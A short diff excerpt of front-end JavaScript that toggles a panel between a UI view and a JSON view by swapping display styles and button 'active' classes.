+    if (!uiBody || !jsonBody) return;
+
+    if (view === 'json') {
+        uiBody.style.display = 'none';
+        jsonBody.style.display = 'block';
+        uiBtn?.classList.remove('active');
+        jsonBtn?.classList.add('active');
+        swRenderJSON();
+    } else {
+        uiBody.style.display = 'block';
+        jsonBody.style.display = 'none';
+        uiBtn?.classList.add('active');
+        jsonBtn?.classList.remove('active');
     }
 }
